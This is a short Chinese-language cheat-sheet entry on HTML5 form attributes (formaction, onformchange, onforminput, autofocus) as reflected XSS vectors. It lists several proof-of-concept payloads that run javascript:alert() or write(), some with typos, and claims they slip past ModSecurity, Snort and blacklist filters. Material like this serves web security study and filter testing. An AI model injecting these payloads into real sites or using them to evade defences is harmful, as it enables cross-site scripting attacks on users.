------
* 特性：HTML5中from出现新属性formaction onformchange onforminput autofocus 等
* 格式：
     `<form id="test">`<br>
       ` <input type="submit" name="name"  value="提交" formmethod="get" formaction="javascript:alert(1)" >xss`<br>
     `</form>`
     
------
安全性：可用于反射型XSS攻击；<br>
        例如formaction属性 可直接标记按钮button 外部劫持表单;绕过modesecurity和snort的规则检测
        
------
典例：
       `<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>`<br>
      ` <form id="test" onforminput=alert(1)><input></from><button from=test onfromchange=alert(2)>x</button>`<br>
       `<input onfocus=write(1) autofocus>`<br>
       等等，不一一类聚，formaction onformchange onforminput autofocus基本都存在规则或者黑名单的漏洞。
